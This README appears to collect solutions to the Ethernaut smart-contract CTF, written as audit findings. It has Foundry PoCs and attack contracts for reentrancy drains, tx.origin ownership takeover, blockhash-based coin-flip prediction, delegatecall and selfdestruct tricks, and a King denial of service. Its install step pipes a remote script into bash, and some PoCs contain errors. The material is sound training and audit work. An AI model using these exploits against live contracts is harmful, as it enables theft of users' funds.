# Solution to the [Ethernaut](https://ethernaut.openzeppelin.com/) challenges

## Installation
1. If you haven't already, install Foundry on your machine, using the following commands:
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
2. Clone the [Ethernaut Foundry Solutions Repository](https://github.com/LhoussainePh2001/Ethernaut) (don’t forget to leave a star on Github 😉)
3. Execute `forge build`
4. Create copy `.env_example` to `.env`
5. Fill in the params in your `.env` file

## Repository Structure

1. We will create the challenge smart contract in our Foundry project in the `src\` folder.
2. For every challenge, we will create a script file with the solution in the `script\` folder.
3. For every challenge, we will create a test file with the solution in the `test\` folder  for test .
4. We will get a challenge instance from the [Ethernaut Website](https://ethernaut.openzeppelin.com/).
5. We will paste the instance address in our foundry solution file.
6. We will run our solution script in Foundry.
7. We will submit the challenge through the [Ethernaut Website](https://ethernaut.openzeppelin.com/).
   


#### What is Ethernaut?
[Ethernaut](https://ethernaut.openzeppelin.com/), brought to us by [OpenZeppelin](https://www.openzeppelin.com/), is a Capture The Flag (CTF) style challenge focused on smart contract hacking and auditing. It consists of 29 levels, each progressively more complex, offering an excellent platform to master these skills.

## Solutions


## Fallback

### [H-1] An Attacker can be the Owner by sending the eth with `Fallback::receive` function without sending an amout more than owner , so the new owner can withdrow all the moeny


**Description:**  We can see that the fallback function `receive()` changes the `owner` to `msg.sender`. The function first check two condition in `require()`: we need to call receive() with a `msg.value` greater than zero and we need to have already made a contribution.

```javascript

        receive() external payable {
    
@>          require(msg.value > 0 && contributions[msg.sender] > 0);
         
@>         owner = msg.sender;

     }

```

**Impact:** Cliam the ownership & drain all the moeny

**Proof of Concept:** (Proof of Code)

write this code in test file :

<details>
<summary>PoC</summary>

```javascript

contract FallbackTest is Test {

    Fallback fall;


    address payable attacker = payable(makeAddr("attacker"));

 function setUp() public {

    fall = new Fallback(); 


    vm.deal(attacker, 1 ether);

 }

    modifier addContribution (){

        for(uint160 i = 1 ; i < 10 ; i++ ){

            hoax(address(i), 1 ether);
            fall.contribute{value : 0.0001 ether}(); // all the player deposit 0.0001 ether
        
        }

    _;

    }

    function testWithdrowAlltheEther() public addContribution {


        console.log("before attack ");
        console.log("balance of Contract :" , address(fall).balance);
        console.log("balance of Attacker :" , attacker.balance);
   


        vm.startPrank(attacker);
        fall.contribute{value :1 wei }();
        (bool secc ,) = address(fall).call{value : 1 wei}("");

        // Check the  Owner

        console.log(" New Owner        :" , fall.owner());
        console.log(" Attacker address :" , attacker);
        

        // withdrow all Ether

        fall.withdraw();

        vm.stopPrank();


        console.log("After attack ");
        console.log("balance of Contract :" , address(fall).balance);
        console.log("balance of Attacker :" , attacker.balance);
        

    }

}



```

</details>

**Recommended Mitigation:**

1. Remove line of setting owner & call `Fallback::contribute` function :

```diff
       
     receive() external payable {
    
+      contribute();

-        require(msg.value > 0 && contributions[msg.sender] > 0);         
-         owner = msg.sender;

 }

```

## Fallout

### [H-2] A `Fallout::Fal1out` function is not a constructor , so any one can be the owner

**Description:** Here again, we simply need to take ownership of the contract. We can see that the "constructor" function is actually a regular function and thus callable by anyone. Calling it will change the `owner` to `msg.sender` and we are already done:

```javascript
@>   function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

```
**Impact:** Caim Ownership


**Recommended Mitigation:** 

change the `Fallout::Fal1out` function name to `Fallout::Fallout` 

```diff

+    function Fallout() public payable {
-    function Fal1out() public payable {

```
Or :

```diff

+    constructor() public payable {}
-    function Fal1out() public payable {


```


## CoinFlip

### [H-3] Weak-randomness RNG in `CoinFlip::flip` function

**Description:**  We need to do 10 coin flip and win ten times consecutively. Guessing give us a 1 in 2^10 odds, so we need to find a way to cheat the contract. Luckily for us, getting a random number is extremely hard, even more so with a smart contract.
By looking at the CoinFlip contract, we can see the logic of the RNG. It is based on a constant factor `FACTOR` and the hash of the previous block `blockhash`. The constant factor is know and so is the hash. We need to create a smart contract that will call the `flip()` functioin for us and compute the correct guess.

```javascript

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
.
.
.
.

    function flip(bool _guess) public returns (bool) {

        uint256 blockValue = uint256(blockhash(block.number - 1));
       
        uint256 coinFlip = blockValue / FACTOR; 

        bool side = coinFlip == 1 ? true : false; 

```

**Impact:** Guess the correct outcome 10 time

**Proof of Concept:** (Proof of Code)

write the following code in test file :

<details><summary>PoC</summary>

```javascript

contract CoinFlipTest is Test {

    CoinFlip flip;

    Hack hack;

    address player = makeAddr("PL");
    function setUp() public {

        flip = new CoinFlip();
        hack = new Hack(flip);

    }

    function testGuesstheCorrectOutCome() public {


        for(uint256 i=1 ; i< 11 ;i++){

            vm.roll(block.number + i);

            hack.attack();
        }
    
        assert(flip.consecutiveWins() == 10);

    }


}


```

add this as well :

```javascript

contract Hack {

    CoinFlip  flip;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


    constructor(CoinFlip _flip) {

        flip = _flip;

    }

    function gusses() public returns(bool){

        uint256 blockValue = uint256(blockhash(block.number - 1));
       
        uint256 coinFlip = blockValue / FACTOR; 

        bool side = coinFlip == 1 ? true : false; 

        return side;
    }
    
    function attack() public {

        bool guess = gusses();

        flip.flip(guess);
    }
    
}

```

</details>

**Recommended Mitigation:**  

1. True randomness
In order to have true randomness in a smart contract, we need to use an oracle such as [Chainlink VRF](https://docs.chain.link/docs/chainlink-vrf/) (Verifiable Random Function)

2.  blockhash

blockhash(uint blockNumber) returns (bytes32): hash of the given block - only works for 256 most recent blocks

##  Telephone

### [H-4] In `Telephone::changeOwner` function the condition to change owner can be satify ,

**Description:** `tx.origin` is the first user make the TX , and the `msg.sender` can be anyone , so if an attacker use another contract to change the owner can satify the condition with means claim the ownership .

To have these two being different, we use our `AttackTelephone.sol` contract as a middleman.

We first call our `attackContract.sol` contract that will then call the Telephone instance. For the Telephone contract, `tx.origin` will be our EOA's address and `msg.sender` will be our AttackTelephone contract's address. Telephone will then change the owner to the parameter passed by our contract `changeOwner()` function.



```javascript

    // alice        -> hack         ->Telephone
    // tx.origin    -> alice        -> alice
    // ms.sneder    -> alice        -> hack
    
    // tx.origine =>  first one make tx
    // msg.sender => anyone make tx

```
 
**Impact:** Claim the ownership

**Proof of Concept:** (Proof of Code)

write the code in test file :

<details>
<summary>PoC</summary>

```javascript

contract TelephoneTest is Test {
    
    Telephone tel;

    attackContract attack;

    address newOwner = makeAddr("NOw");

    function setUp() public {
        
        tel = new Telephone();
        
        attack = new attackContract();

    }

    function testToBreakOwnership() public {
        
        address prevOwner = tel.owner();

        vm.startPrank(address(attack));
        tel.changeOwner(newOwner);
        vm.stopPrank();
        address currentOwner = tel.owner();

        assert(currentOwner == newOwner);
        assert(currentOwner != prevOwner);

    }
}

contract attackContract {

    constructor(){}

}
```
</details>

**Recommended Mitigation:**  

here is an recommendation :

```diff

    function changeOwner(address _owner) public {

-        if (tx.origin != msg.sender) {
+        require(msg.sender == owner);
            owner = _owner;
-        }
    }

```

## Token

### [H-5] Using solidity `v0.6` , Overflow or Uderflow

**Description:** In solidity `v0.6` there is a isseu , it will reset a max of type to zero and in another ways make the numer zero mutch more if we minis one .

```javascript
// Max_Number + 1 = 0 
// 0 - 1 = Max_Number 

```
```
balances[msg.sender] - _value // 20 - 21 = 2^256 -1
```
The uint256 will underflow and give us a huge number for our new balance.

**Impact:** Overflow && Underflow

**Proof of Concept:** (Proof of Code)

write the following code in test file  :

<details>
<summary>PoC</summary>

```javascript

contract TokenTest is Test {

    Token tok;

    Hack hak;

    function setUp() public {

        tok = new Token(20);
        hak = new Hack(tok);

    }

    function testIncrementtoken() public {

        vm.prank(address(hak));
        hak.attack();


        console.log(tok.balanceOf(address(hak)));
        
    }
}


```
add this one as well :

```javascript
contract Hack {


    Token tok;

    constructor(Token _tok) {

        tok = _tok;
    }

    function attack() public {

        tok.transfer(msg.sender, 21);

    }
}

```

</details>

**Recommended Mitigation:**  Use a newer version of solidity :
Overflows are very common in solidity and must be checked for with control statements such as:
```
if(a + c > a) {
  a = a + c;
}
```
An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:

```
a = a.add(c);
```
If there is an overflow, the code will revert.


```diff
- pragma solidity ^0.6.0;

+ pragma solidity ^0.8.0;

```

## Delegate

### [H-6] Claim the Ownership by delegatecall() function 

**Description:**  So we need to gain ownership of the Delegation contract. This one seems already a bit more tricky than the other ones. We can see that the contract has a `fallback()` function. Fallback functions are special function in a solidity contract that get called when no function match the signature of the call. (`receive()` works similarly but when datacall is empty, used to receive ether).

The function first line is `address(delegate).delegatecall(msg.data);`. `delegatecall()` is a function thats works like a regular message call except that the context in which the code is exectued is the one of the calling contract and not the called contract. This means we can call a function of `Delegate.sol` but within the context of the `Delegation.sol` contract instance. The argument given to `delegatecall()` is `msg.data`.

A message call has several field: from, to, gas, gaslimit, and data. `msg.data` allowed the contract to have access to this data field. It's structure is as such:
- The first 4 bytes are the method Id: It is derived from the method we want to call (first 4 bytes of Keccak hash of the signature, i.e. 0xdd365b8b for `pwn()`)
- The rest are for the parameter, either the value of the paramter or its location if the parameter is of dynamic type (array, string,...). But we dont need that for this challenge.

To solve this challenge, we just need to find the keccak_hash of `pwn()` and send it in msg.data to the `Delegation.sol` instance.

> `contract.sendTransaction({data:"0xDD365B8B"})`

This will call the `Delegation.sol` instance fallback()
function which will in turn call the `Delegate` `pwn()` function since our `msg.data` contains its the method id. `pwn()` will change the `owner` variable within the context of `Delegation` instance which will give us ownership. `owner` is the variable in the first slot of `Delegate` storage so it will change the first slot of `Delegation` storage which happen to be owner also.

---

1. Fallback() method
A contract can have at most one fallback function, declared using `fallback() external [payable]` (without the function keyword). This function cannot have arguments, cannot return anything and must have external visibility. It is executed on a call to the contract if none of the other functions match the given function signature, or if no data was supplied at all and there is no receive Ether function. The fallback function always receives data, but in order to also receive Ether it must be marked payable.

Even though the fallback function cannot have arguments, one can still use msg.data to retrieve any payload supplied with the call.

2.  Delegatecall() method
There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and `msg.sender` and `msg.value` do not change their values.

Good example of a possible hack on [Solidity-by-example](https://solidity-by-example.org/hacks/delegatecall/)

3. Msg.data
https://ethereum.stackexchange.com/questions/14037/what-is-msg-data

4.  Method Id
0xcdcd77c0: the Method ID. This is derived as the first 4 bytes of the Keccak hash of the ASCII form of the signature `baz(uint32,bool)`

5.  Storage
Each contract has up to 2^256 storage slot of 32 bytes each, in the order of declaration.

---

**Impact:** Claim Ownership

**Proof of Concept:** (Proof of Code)

<details>
<summary>PoC</summary>

write the code in test file :

```javascript
contract DelegateTest is Test {

    Delegate del;
    Delegation dele;

    attackContract attack;

    address owner = makeAddr("OW");

 function setUp() public {

    del = new Delegate(msg.sender);
    vm.prank(owner);
    dele = new Delegation(address(del));
    attack = new attackContract(address(del));

 }

 function testClaimOwnership() public {

    vm.prank(address(attack));
    attack.pwd();


    console.log(owner);
    console.log(del.owner());
    console.log(msg.sender);
    console.log(address(dele));


 }

}


```

and this as well :

```javascript

contract attackContract {

        Delegation delegate;

    constructor(address _delegateAddress) public {
        delegate = Delegation(_delegateAddress);
    }


    function pwd() public {

        (bool secc,) = address(delegate).call(abi.encodeWithSignature("pwd()"));
    }

}


```
</details>

**Recommended Mitigation:**

Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the [The Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7/) article for an accurate explanation of how this idea was used to steal 30M USD.


## Vualt

### [H-7] Passwords stored on-chain are visable to anyone, not matter solidity variable visibility

**Description:** All data stored on-chain is visible to anyone, and can be read directly from the blockchain. The `PasswordStore::s_password` variable is intended to be a private variable, and only accessed through the `PasswordStore::getPassword` function, which is intended to be only called by the owner of the contract. 

However, anyone can direclty read this using any number of off chain methodologies

1. Visibility
public: visible externally and internally (creates a getter function for storage/state variables)

private: only visible in the current contract

external: only visible externally (only for functions) - i.e. can only be message-called (via this.func)

internal: only visible internally

2. Private
Making something private or internal only prevents other contracts from reading or modifying the information, but it will still be visible to the whole world outside of the blockchain.

**Impact:** The password is not private. 

**Proof of Concept:** The below test case shows how anyone could read the password directly from the blockchain. We use [foundry's cast](https://github.com/foundry-rs/foundry) tool to read directly from the storage of the contract, without being the owner. 

1. Create a locally running chain
```bash
make anvil
```

2. Deploy the contract to the chain

```
make deploy 
```

3. Run the storage tool

We use `1` because that's the storage slot of `s_password` in the contract.

```
cast storage <ADDRESS_HERE> 1 --rpc-url http://127.0.0.1:8545
```

You'll get an output that looks like this:

`0x6d7950617373776f726400000000000000000000000000000000000000000014`

You can then parse that hex to a string with:

```
cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014
```


**Recommended Mitigation:** Due to this, the overall architecture of the contract should be rethought. One could encrypt the password off-chain, and then store the encrypted password on-chain. This would require the user to remember another password off-chain to decrypt the password. However, you'd also likely want to remove the view function as you wouldn't want the user to accidentally send a transaction with the password that decrypts your password. 



## king 

### [H-9] Claim the ownership & break the grame


**Description:** We need to block the level from taking back kingship of the instance. Once we submit the instance it will call the receive fct:

```javascript

require(msg.value >= prize || msg.sender == owner);
king.transfer(msg.value);
king = msg.sender;  // becomes the new king
prize = msg.value;

```

In order to block that from happening, we need to make sure this function revert. We can do that by making the transfer line revert. If we make a contract with no receive fct king, it will be impossible to transfer ether to it and this fct will revert and our contract will stay king forever.

---
**Impact:** Breaking the game

**Proof of Concept:** (Proof of Code)
<details>
<summary>PoC</summary>

```javascript
contract KingTest is Test {

    King kin;

    Attacker attacker;


    function setUp() public {

     hoax(address(uint160(1)), 1 ether); 
     kin = new King{value : 0.1 ether}();


    attacker = new Attacker(kin);

    vm.deal(address(attacker),1 ether);
        


    }


    function testNoOneCanbeKing() public {


        vm.prank(address(attacker));
        attacker.attack();          // Now we are the owner

        vm.expectRevert();
        hoax(address(uint160(3)), 1 ether);  // it will revert
        
        (bool secc,) = address(kin).call{value : 1 ether }("");


    }
    
}

```

add this as well :

```javascript
contract  Attacker {

     King kin;

    constructor( King _kin) {
       
        kin = _kin;

    }

    function attack() public {

        (bool secc,) = address(kin).call{value :kin.prize() }("");

    }

    /**
    
    @Note we don't have a receive/fallback function to receive eth  , so transfer will revert

     */

}


```
</details>

**Recommended Mitigation:**

## Force 


### [H-6] Can send eth to the contrcat using `sefdestruct()` function 

**Description:** The main way to send ether to a smart contract is by calling a `payable` function. `Force.sol` doesn't have one. There a a few other way to force a smart contract to take our ether. One one them is with `selfdestruc()`.

`selfdestruct()` is a special method that destroy a smart contract and send its ether balance to a given address. If we create a contract with a function that call `selfdestruct()` and with the `Force.sol` instance address as its receiver, send it some eth and then call destruct the contract, you will have sent ether to our target contract.

---

1. selfdestruct()
The only way to remove code from the blockchain is when a contract at that address performs the selfdestruct operation. The remaining Ether stored at that address is sent to a designated target and then the storage and code is removed from the state. Removing the contract in theory sounds like a good idea, but it is potentially dangerous, as if someone sends Ether to removed contracts, the Ether is forever lost.

2. Force a contract to receive ether
[StackExchange](https://ethereum.stackexchange.com/questions/63987/can-a-contract-with-no-payable-function-have-ether)

---

**Impact:** make the balance of the contrcat geate than zero

**Proof of Concept:** (Proof of Code)

write the code in test file :

<details>
<summary>PoC</summary>


```javascript
contract ForceTest is Test {

    Force forc;

    attackContract attack;

    function setUp() public {

        forc = new Force();

        attack = new attackContract(forc);

        vm.deal(address(attack), 1 ether);

    }


    function testBalanceofForceGreatenThanZero() public {

        vm.prank(address(attack));
        attack.attack();

        console.log(address(this).balance);

        assert(address(this).balance != 0);

    }
    
    
}

```
add this as well :

```javascript

contract attackContract {

    Force forc;

    constructor(Force _forc) payable {

        forc = _forc;

    }

    function attack() external payable {

        selfdestruct(payable(address(forc)));
    }
}

```
</details>

**Recommended Mitigation:**

In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.

However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.




## Reentrance 

### [H-10] Reentrancy attack in `Reentrance::widthraw` allows entrant to drain all the refund balance .

**Description:** the `Reentrance::widthraw` function does not follow the CEI (Check , Effect , Interaction ) so as result , enable the participant to drain the contract balance .

In the `Reentrance::widthraw` function,we first make an external call to the `msg.sender` address and only after making that external call do we update the user.

```javascript

  function withdraw(uint _amount) public {

    if(balances[msg.sender] >= _amount) {
@>      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }

      balances[msg.sender] -= _amount;

    }
  }

```
**Impact:** Drain the contract from ETH

**Proof of Concept:** (Proof of Code)

write the code in test file :

<details>
<summary>PoC</summary>

```javascript

contract ReentranceTest is Test {

    Reentrance ret;

    ReentranceAttack attack;

    address newOwner = makeAddr("NOw");

    function setUp() public {

        ret = new Reentrance();
        
        attack = new ReentranceAttack(ret);

        vm.deal(address(attack), 1 ether);


    }

    modifier addDonate {

        for(uint160 i = 1 ; i < 3 ; i++){

            hoax(address(i),1 ether);
            ret.donate{value : 1 ether}(address(i));

        }

        _;
    }
    

    function testAttackAllthemoney() public addDonate {


        vm.prank(address(attack));
        attack.attack_1();


        console.log("Balance of Contract : " , address(ret).balance);
        console.log("Balance of Attacker : " , address(attack).balance);
        
    }
}


```

add this as well :

```javascript
contract ReentranceAttack {

    Reentrance ret;

    constructor(Reentrance _ret){

        ret = _ret;
    }


    function attack_1() public payable{
        ret.donate{value: 1 ether}(address(this));
        ret.withdraw(1 ether);
    }


    receive() external payable {

        if(address(ret).balance > 0){
              ret.withdraw(1 ether);

        }

    }

    fallback() external payable {}
}

```
</details>

**Recommended Mitigation:** To prevent this , we should have the `Reentrance:widthraw` function update the `Reentrance::balances` mapping before makig the external call . Additionally , we should move the event emission up as well .

```diff

  function withdraw(uint _amount) public {


    if(balances[msg.sender] >= _amount) {

+      balances[msg.sender] -= _amount;

      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }

-      balances[msg.sender] -= _amount;
    }
  }

```

## Elevator 

### [L-1] To reach the top of the buiding (bool top = true)

**Description:** 

We just need to set the `top` variable to `true`. The function `goTo()` can do that:

```javascript

function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);  //our contract need to be a Building

    if (!building.isLastFloor(_floor)) {  // isLastFloor need to be false
        floor = _floor;
        top = building.isLastFloor(floor);  // now isLastFloor need to be true
    }
}
```
So we just need to create a contract with a `isLastFloor(uint256)` function that return `false` the first time it is called and `true` the second time. This easily do the trick:

```javascript

function isLastFloor(uint256 _floor) external returns (bool) {
    bool ret = top;
    top = !top;
    return ret;
}

```

---
Don't really understand what there is to learn here though.

---

**Proof of Concept:** (Proof of Code)

write the code in test file :

<details>
<summary>PoC</summary>

```javascript
contract ElevatorTest is Test {

    Elevator elev;
    Hack hack;

    address player = makeAddr("PL");
    function setUp() public {

        elev = new Elevator();
        hack = new Hack(elev);


    }

    function testSetToptoTrue() public {

        vm.prank(address(hack));
        hack.attack();

        console.log(elev.top());

        assert(elev.top() == true);

    }
    
}


```
add this as well :

```javascript

contract Hack {


    bool public top;
    Elevator public elevator;

    constructor(Elevator _elevator) {
        top = false;
        elevator = _elevator;
    }

    function attack() public {
        elevator.goTo(8);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        bool ret = top;
        top = !top;
        return ret;
    }
}

```
</details>

**Recommendation**

You can use the view function modifier on an interface in order to prevent state modifications. The pure modifier also prevents functions from modifying the state. Make sure you read Solidity's documentation and learn its caveats.

An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. gasleft().

